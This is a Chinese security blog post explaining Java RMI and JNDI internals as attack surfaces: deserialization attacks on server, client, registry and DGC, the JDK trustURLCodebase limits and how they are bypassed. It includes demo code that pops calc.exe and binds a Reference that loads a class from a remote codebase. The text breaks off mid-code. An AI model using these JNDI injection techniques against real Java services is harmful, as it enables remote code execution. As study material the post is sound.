<!DOCTYPE html>
<html lang="zh-CN">

<head>
    <meta charset="UTF-8">
<meta name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

    <meta name="author" content="mayylu">



    <meta name="description" content="学习是一种生活态度">



<title>java jndi | mayylu&#39;s blog</title>



    <link rel="icon" href="/vue.ico">




    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/css/style.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/js/script.js"></script>
    
    <script src="/js/tocbot.min.js"></script>
    



    
    
        
    


<meta name="generator" content="Hexo 5.4.0"></head>

<body>
    <script>
        // this function is used to check current theme before page loaded.
        (() => {
            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
            const isDark = currentTheme === 'dark';
            const pagebody = document.getElementsByTagName('body')[0]
            if (isDark) {
                pagebody.classList.add('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
            } else {
                pagebody.classList.remove('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "· Light"
            }
        })();
    </script>

    <div class="wrapper">
        <header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/">mayylu&#39;s Blog</a></div>
            <div class="menu navbar-right">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/categories">Categories</a>
                
                    <a class="menu-item" href="/tags">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
                <input id="switch_default" type="checkbox" class="switch_default">
                <label for="switch_default" class="toggleBtn"></label>
            </div>
        </div>
    </nav>

    
    <nav class="navbar-mobile" id="nav-mobile">
        <div class="container">
            <div class="navbar-header">
                <div>
                    <a href="/">mayylu&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
                </div>
                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
            </div>
            <div class="menu" id="mobile-menu">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/categories">Categories</a>
                
                    <a class="menu-item" href="/tags">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
            </div>
        </div>
    </nav>

</header>
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if(toggleMenu.classList.contains("active")){
           toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        }else{
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>
            <div class="main">
                <div class="container">
    
    
        <div class="post-toc">
    <div class="tocbot-list">
    </div>
    <div class="tocbot-list-menu">
        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
        <a onclick="go_top()">Back to top</a>
        <a onclick="go_bottom()">Go to bottom</a>
    </div>
</div>

<script>
    var tocbot_timer;
    var DEPTH_MAX = 6; // 为 6 时展开所有
    var tocbot_default_config = {
        tocSelector: '.tocbot-list',
        contentSelector: '.post-content',
        headingSelector: 'h1, h2, h3, h4, h5',
        orderedList: false,
        scrollSmooth: true,
        onClick: extend_click,
    };

    function extend_click() {
        clearTimeout(tocbot_timer);
        tocbot_timer = setTimeout(function() {
            tocbot.refresh(obj_merge(tocbot_default_config, {
                hasInnerContainers: true
            }));
        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
    }

    document.ready(function() {
        tocbot.init(obj_merge(tocbot_default_config, {
            collapseDepth: 1
        }));
    });

    function expand_toc() {
        var b = document.querySelector('.tocbot-toc-expand');
        var expanded = b.getAttribute('data-expanded');
        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
        tocbot.refresh(obj_merge(tocbot_default_config, {
            collapseDepth: expanded ? 1 : DEPTH_MAX
        }));
        b.innerText = expanded ? 'Expand all' : 'Collapse all';
    }

    function go_top() {
        window.scrollTo(0, 0);
    }

    function go_bottom() {
        window.scrollTo(0, document.body.scrollHeight);
    }

    function obj_merge(target, source) {
        for (var item in source) {
            if (source.hasOwnProperty(item)) {
                target[item] = source[item];
            }
        }
        return target;
    }
</script>
    

    
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">java jndi</h1>
            
                <div class="post-meta">
                    
                        Author: <a itemprop="author" rel="author" href="/">mayylu</a>
                    

                    
                        <span class="post-time">
                        Date: <a href="#">十一月 5, 2023&nbsp;&nbsp;</a>
                        </span>
                    
                    
                        <span class="post-category">
                    Category:
                            
                                <a href="/categories/java/">java</a>
                            
                        </span>
                    
                </div>
            
        </header>

        <div class="post-content">
            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p> JNDI全称为 Java Naming and DirectoryInterface（Java命名和目录接口），是一组应用程序接口，为开发人员查找和访问各种资源提供了统一的<strong>通用接口</strong>,但是jndi的参数不一定可控，在实战中jndi常常被用来上传我们的后门或执行自定义恶意代码，如fastjson的com.sun.rowset.JdbcRowSetImpl，也就是<strong>服务端攻击客户端</strong></p>
 <span id="more"></span>

<h2 id="javaRMI"><a href="#javaRMI" class="headerlink" title="javaRMI"></a>javaRMI</h2><p>Java RMI（Remote Method Invocation）是Java提供的一种远程方法调用机制。它允许在分布式系统中的不同Java虚拟机（JVM）之间进行方法调用。</p>
<pre><code>Client-客户端：客户端调用服务端的方法，并发送序列化的参数信息
Server-服务端：远程调用方法对象的提供者，也是代码真正执行的地方，执行结束会序列化传输给客户端执行的结果,因此在Clinet看来，就好像是在本地执行了这个方法
</code></pre>
<p><img src="https://cdn.jsdelivr.net/gh/mayylu/pic@main/blogs/11168448452.png" alt="11168448452"><br>当client想调用server上方法的时候，就可以调用stub上的相同的方法，但是stub里面只有和网络相关的处理逻辑，并没有对应的业务处理逻辑。客户端和stub对话，stub和skeleton对话，skeleton和server对话，server执行真正的方法</p>
<h3 id="RMI-Registry"><a href="#RMI-Registry" class="headerlink" title="RMI Registry"></a>RMI Registry</h3><p>Registry-注册中心：其实本质就是一个map，相当于是字典一样，用于客户端查询要调用的方法的引用，在低版本的JDK中，Server与Registry是可以不在一台服务器上的，而在高版本的JDK中，Java中对于RMI Registry做了限制，只有源地址为localhost时才能调用bind、rebind(bind+unbind)、unbind等方法</p>
<p><img src="https://cdn.jsdelivr.net/gh/mayylu/pic@main/blogs/1705827-20190614004450896-1636413620.png" alt="1705827-20190614004450896-1636413620"></p>
<p>虽然Server与Registry大概率是在同一台机器上，但是和client和server一样也是使用Stub 与 Skel 之间的通信模式，只不过具体被调用的逻辑不用自己编写</p>
<p>调用流程:</p>
<ol>
<li>Registry通过<code>LocateRegistry.createRegistry</code>创建一个Registry,在其中创建了一个<strong>Skeleton</strong></li>
<li>client和server通过<code>LocateRegistry.getRegistry(ip,port)</code>在本地创建一个<strong>Stub对象</strong>作为Registry远程对象的代理</li>
<li>service通过<code>registry.bind()</code>将我们要发送的name以及Remote远程对象序列化发送了过去，Registry则据此构造一个stub对象,并添加到<code>this.bindings</code>路由表中</li>
<li>当客户端使用<code>registry.lookup()</code>，RMIRegistry 就会返回这个stub给客户端调用</li>
</ol>
<h3 id="client和server的通讯"><a href="#client和server的通讯" class="headerlink" title="client和server的通讯"></a>client和server的通讯</h3><p>Server端往往是开启两个端口的，一个1099端口用于Registry，另一个是随机端口用于与Client通信<br>调用流程:</p>
<ol>
<li>Server监听一个端口，这个端口是JVM随机选择的，并将包括IP，开放的随机端口，codebase等在bind时添加到传入的stub对象</li>
<li>RMI Client 远程连接RMI Registry端口，调用通过lookup获得的stub上的方法</li>
<li>调用时会去codebase所指向的地址加载类(urlclass)，如果没有找到则说明是远程对象</li>
<li>客户端和服务端建立连接，方法在远程server上执行，并发执行结果返回给stub<h3 id="示例代码"><a href="#示例代码" class="headerlink" title="示例代码"></a>示例代码</h3>服务端(在实际应用中Server和Registry一般放在一起)：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//创建远程接口</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">evil</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">evil</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//实现类：创建远程类。这个类是服务端的实现，它实现了远程接口定义的方法。</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">eviltest</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title">evil</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="title">eviltest</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">evil</span><span class="params">()</span>  <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//向Registry注册远程对象</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">rmiserver</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Registry registry =LocateRegistry.createRegistry(<span class="number">1089</span>);<span class="comment">//创建并启动了注册器Registry</span></span><br><span class="line">        evil evil = <span class="keyword">new</span> eviltest();</span><br><span class="line">        registry.rebind(<span class="string">&quot;evil&quot;</span>, evil);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<p>客户端调用服务端接口：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">rmiclienr</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        evil evil = (evil) Naming.lookup(<span class="string">&quot;rmi://10.24.38.47/evil&quot;</span>);<span class="comment">//注意这里应该强转为接口类</span></span><br><span class="line">        <span class="comment">//RMI Naming是对RMI Registry的一种封装和扩展，底层还是Registry，在使用默认的1099端口的情况下，可以在远程对象的URL中省略端口号</span></span><br><span class="line">        evil.evil();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="安全限制"><a href="#安全限制" class="headerlink" title="安全限制"></a>安全限制</h3><h4 id="java-rmi-server-useCodebaseOnly"><a href="#java-rmi-server-useCodebaseOnly" class="headerlink" title="java.rmi.server.useCodebaseOnly"></a>java.rmi.server.useCodebaseOnly</h4><p>从JDK 6u45、7u21开始，该参数默认值为 true 的情况下，Java虚拟机将只信任预先配置好的codebase，不再支持从RMI请求中获取codebase。</p>
<h3 id="rmi反序列化"><a href="#rmi反序列化" class="headerlink" title="rmi反序列化"></a>rmi反序列化</h3><p>java在jep290中对rmi限制的还是比较狠的，8u241修复之后基本上就没有利用的方式了<br>Java RMI使用了Java序列化机制来将参数和返回值在客户端和服务端之间进行传输。被传输的对象需要实现Serializable接口，或者使用其他可序列化的方式。<br>攻击Server端</p>
<p>当客户端需要调用的远程方法的参数中含有Object类，此时Client可以发送一个恶意的对象。由于远程对象是以序列化形式进行传输的，Server端接收的时候势必会对其进行反序列化</p>
<p>Server攻击Client</p>
<p>在RMI过程中，Server会把远程方法执行的结果返回给Client端，如果返回的结果是一个对象，那么这个对象会被序列化传输，并在Client端被反序列化</p>
<p>Server攻击Registry</p>
<p>在使用 Registry 时，首先由 Server 端向 Registry 端绑定服务对象，Registry 端会反序列化这个类并存在自己的 RegistryImpl 的 bindings 中，以供后续的查询。我们可以绑定一个动态代理类，在其反序列化时就可以触发恶意调用</p>
<h4 id="攻击-DGC"><a href="#攻击-DGC" class="headerlink" title="攻击 DGC"></a>攻击 DGC</h4><p>伴随着 RMI 服务启动的还有 DGC 通信，DGC作用是跟踪stub的使用，检查它们是否还被其他对象引用，如果没有，则认为该远程对象已经成为无用对象，可以被垃圾回收器回收<br>Server 端启动 DGCImpl，在 Registry 端注册 DGCImpl_Stub ，Client 端获取到 DGCImpl_Stub，通过其与 Server 端通信，Server 端使用 DGCImpl_Skel 来处理。<br>由于 DGC 通信和 RMI 通信在 Transport 层是同样的处理逻辑，只不过根据 Client 端写入的标记来区分是是由 RegistryImpl_Skel 还是 DGCImpl_Skel 来处理，因此我们可以使用 DGC 来攻击任意一个由 JRMP 协议监听的端口，包括 Registry 端监听端口、RegistryImpl_Stub 监听端口、DGCImpl_Stub 监听端口。</p>
<h2 id="java-jndi"><a href="#java-jndi" class="headerlink" title="java jndi"></a>java jndi</h2><p><img src="https://cdn.jsdelivr.net/gh/mayylu/pic@main/blogs/jVWyTehR6InovSu.png" alt="jVWyTehR6InovSu"><br>JNDI就是一组API接口。每一个对象都有一组唯一的键值绑定，将名字和对象绑定，可以通过名字检索指定的对象，而该对象可能存储在RMI、LDAP、CORBA等等，也就是说jndi简化了客户端的操作，只用协议解析就可以调用不同的方法了</p>
<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p><img src="https://cdn.jsdelivr.net/gh/mayylu/pic@main/blogs/Reference-1-1024x492.png" alt="Reference-1-1024x492"></p>
<p>在JNDI服务中，RMI服务端除了直接绑定远程对象以外，还可以通过<strong>Reference</strong>类来绑定一个外部的远程对象，这个远程对象是当前名称目录系统之外的对象，绑定了Reference之后，服务端会先通过Referenceable.getReference()获取绑定对象的引用，并且在目录中保存。</p>
<h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><p>使用JNDI解析调用远程RMI方法<br>客户端<br> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">// 获取远程对象引用</span></span><br><span class="line">Context namingContext = <span class="keyword">new</span> InitialContext();</span><br><span class="line">EvilObject remoteObj = (EvilObject) namingContext.lookup(<span class="string">&quot;rmi://localhost/refObj&quot;</span>);<span class="comment">//示例代码通过lookup会自动使用rmiURLContext处理RMI请求。</span></span><br><span class="line"><span class="comment">// 调用远程方法</span></span><br><span class="line">String result = remoteObj.sayHello();</span><br></pre></td></tr></table></figure><br> 服务端<br> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line"> <span class="comment">// Reference需要传入三个参数 (className,factory,factoryLocation)</span></span><br><span class="line"> <span class="comment">// 第一个参数为别名，第二个参数填写我们http服务下的类名，第三个参数填写我们的远程地址</span></span><br><span class="line">    Reference refObj = <span class="keyword">new</span> Reference(<span class="string">&quot;Evil&quot;</span>, <span class="string">&quot;EvilObject&quot;</span>, <span class="string">&quot;http://127.0.0.1:8000/&quot;</span>);</span><br><span class="line">    ReferenceWrapper refObjWrapper = <span class="keyword">new</span> ReferenceWrapper(refObj);</span><br><span class="line">    registry.bind(<span class="string">&quot;refObj&quot;</span>, refObjWrapper);</span><br></pre></td></tr></table></figure></p>
<h5 id="Reference-1"><a href="#Reference-1" class="headerlink" title="Reference"></a>Reference</h5><p>在Java中，javax.naming.Reference类是用于描述一个命名对象的基本信息的。该类提供了一种通用的方式来表示对象在一个JNDI上下文中的引用。Reference对象可以被绑定到一个JNDI上下文中，然后通过名称进行检索并返回。</p>
<p>Reference对象通常包含了以下信息：<br>    对象的类名<br>    工厂类的类名<br>    工厂类需要的参数<br>    其他附加信息</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> String className;</span><br><span class="line"><span class="keyword">protected</span> String classFactory = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">protected</span> String classFactoryLocation = <span class="keyword">null</span>;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="title">Reference</span><span class="params">(String className, String factory, String factoryLocation)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">this</span>(className);</span><br><span class="line">       classFactory = factory;</span><br><span class="line">       classFactoryLocation = factoryLocation;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> String <span class="title">getFactoryClassName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">       <span class="keyword">return</span> classFactory;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> String <span class="title">getFactoryClassLocation</span><span class="params">()</span> </span>&#123;</span><br><span class="line">       <span class="keyword">return</span> classFactoryLocation;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<h5 id="ReferenceWrapper"><a href="#ReferenceWrapper" class="headerlink" title="ReferenceWrapper"></a>ReferenceWrapper</h5><p>ReferenceWrapper只是对Reference进行简单的包装</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ReferenceWrapper</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title">RemoteReference</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> Reference wrappee;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">6078186197417641456L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ReferenceWrapper</span><span class="params">(Reference var1)</span> <span class="keyword">throws</span> NamingException, RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.wrappee = var1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Reference <span class="title">getReference</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.wrappee;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="安全限制-1"><a href="#安全限制-1" class="headerlink" title="安全限制"></a>安全限制</h4><p>该方法在底层实现中不同与rmi，rmi是使用RMIClassLoader.loadClass加载的，而是在Naming/Directory服务中里使用URLClassLoader加载的，因此不受 <strong>java.rmi.server.useCodebaseOnly</strong> 系统属性的限制</p>
<p>在6u141,7u131,8u121之后，新增了 <strong>com.sun.jndi.rmi.object.trustURLCodebase</strong>选项，默认为false，禁止RMI和CORBA协议通过RMI从远程的Codebase加载Reference工厂类，该更新阻止了RMI和CORBA触发漏洞<br>随后在6u211,7u201.8u191中，又新增了 <strong>com.sun.jndi.ldap.object.trustURLCodebase</strong>选项，默认为false，禁止LDAP协议使用远程codebase选项</p>
<h3 id="使用本地的Reference-Factory类绕过高版本限制"><a href="#使用本地的Reference-Factory类绕过高版本限制" class="headerlink" title="使用本地的Reference Factory类绕过高版本限制"></a>使用本地的Reference Factory类绕过高版本限制</h3><h4 id="JNDI底层实现"><a href="#JNDI底层实现" class="headerlink" title="JNDI底层实现"></a>JNDI底层实现</h4><p>这里以<strong>rmi的lookup方法</strong>为例</p>
<h5 id="RegistryContext"><a href="#RegistryContext" class="headerlink" title="RegistryContext"></a>RegistryContext</h5><p><strong>com.sun.jndi.rmi.registry.RegistryContext</strong>是Java中的一个类，实现了JNDI API提供的上下文接口(javax.naming.Context)，用于访问RMI注册表中的对象。<br>该类是JNDI API的一个具体实现，允许客户端通过JNDI API访问远程RMI注册表，并使用像本地文件系统一样的方式来查找和绑定对象</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">lookup</span><span class="params">(Name var1)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (var1.isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> RegistryContext(<span class="keyword">this</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Remote var2;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                var2 = <span class="keyword">this</span>.registry.lookup(var1.get(<span class="number">0</span>));</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NotBoundException var4) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> NameNotFoundException(var1.get(<span class="number">0</span>));</span><br><span class="line">            &#125; <span class="keyword">catch</span> (RemoteException var5) &#123;</span><br><span class="line">                <span class="keyword">throw</span> (NamingException)wrapRemoteException(var5).fillInStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.decodeObject(var2, var1.getPrefix(<span class="number">1</span>));<span class="comment">//返回最终结果</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> Object <span class="title">decodeObject</span><span class="params">(Remote var1, Name var2)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;<span class="comment">//var1为我们传入的ReferenceWrapper</span></span><br><span class="line">            Object var3 = var1 <span class="keyword">instanceof</span> RemoteReference ? ((RemoteReference)var1).getReference() : var1;</span><br><span class="line">            Reference var8 = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">if</span> (var3 <span class="keyword">instanceof</span> Reference) &#123;</span><br><span class="line">                var8 = (Reference)var3;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var3 <span class="keyword">instanceof</span> Referenceable) &#123;</span><br><span class="line">                var8 = ((Referenceable)((Referenceable)var3)).getReference();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (var8 != <span class="keyword">null</span> &amp;&amp; var8.getFactoryClassLocation() != <span class="keyword">null</span> &amp;&amp; !trustURLCodebase) &#123;<span class="comment">//限制点，如果trustURLCodebase为false,则会检测是否设置了传入的Reference是否设置了classFactoryLocation</span></span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> ConfigurationException(<span class="string">&quot;The object factory is untrusted. Set the system property &#x27;com.sun.jndi.rmi.object.trustURLCodebase&#x27; to &#x27;true&#x27;.&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> NamingManager.getObjectInstance(var3, var2, <span class="keyword">this</span>, <span class="keyword">this</span>.environment);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NamingException var5) &#123;</span><br><span class="line">            <span class="keyword">throw</span> var5;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException var6) &#123;</span><br><span class="line">            <span class="keyword">throw</span> (NamingException)wrapRemoteException(var6).fillInStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var7) &#123;</span><br><span class="line">            NamingException var4 = <span class="keyword">new</span> NamingException();</span><br><span class="line">            var4.setRootCause(var7);</span><br><span class="line">            <span class="keyword">throw</span> var4;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h5 id="2024-10-21补—从底层看rmi如何获得远程类"><a href="#2024-10-21补—从底层看rmi如何获得远程类" class="headerlink" title="2024/10/21补—从底层看rmi如何获得远程类"></a>2024/10/21补—从底层看rmi如何获得远程类</h5><p>这里与绕过jndi高版本限制无关，主要是想分析一下，rmi是如何连接服务器并获得类的，一些底层方法同样是危险的</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">RegistryImpl_Stub</span> <span class="keyword">extends</span> <span class="title">RemoteStub</span> <span class="keyword">implements</span> <span class="title">Registry</span>, <span class="title">Remote</span> </span>&#123;</span><br><span class="line"> <span class="function"><span class="keyword">public</span> Remote <span class="title">lookup</span><span class="params">(String var1)</span> <span class="keyword">throws</span> AccessException, NotBoundException, RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            RemoteCall var2 = <span class="keyword">this</span>.ref.newCall(<span class="keyword">this</span>, operations, <span class="number">2</span>, <span class="number">4905912898345647071L</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                ObjectOutput var3 = var2.getOutputStream();</span><br><span class="line">                var3.writeObject(var1);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException var17) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> MarshalException(<span class="string">&quot;error marshalling arguments&quot;</span>, var17);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">this</span>.ref.invoke(var2);</span><br><span class="line"></span><br><span class="line">            Remote var22;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                ObjectInput var4 = var2.getInputStream();</span><br><span class="line">                var22 = (Remote)var4.readObject();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException var14) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> UnmarshalException(<span class="string">&quot;error unmarshalling return&quot;</span>, var14);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException var15) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> UnmarshalException(<span class="string">&quot;error unmarshalling return&quot;</span>, var15);</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                <span class="keyword">this</span>.ref.done(var2);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> 